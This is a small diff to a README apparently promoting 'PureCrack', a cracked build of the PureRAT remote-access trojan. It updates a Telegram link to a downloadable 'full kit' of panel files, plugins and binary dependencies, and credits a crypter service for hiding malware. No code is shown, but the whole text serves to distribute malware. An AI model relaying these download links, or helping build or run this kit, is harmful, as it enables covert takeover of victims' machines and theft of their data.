@@ -11,7 +11,7 @@ From [Crypter.Cloud](https://Crypter.Cloud) and [@CrypterGateway](https://t.me/C
 
 To build and run PureCrack, you need the panel files (PureRAT.exe, data.pak, Plugins/) plus binary dependencies (protobuf-net.dll, compile_response.bin). Download the complete pre-assembled kit including everything:
 
-**🔗 [Download PureCrack Full Kit](https://t.me/clownsprotector/15)**
+**🔗 [Download PureCrack Full Kit](https://t.me/clownsprotector/43)**
 
 The full kit includes:
 - All source code from this repo (pre-built optional)
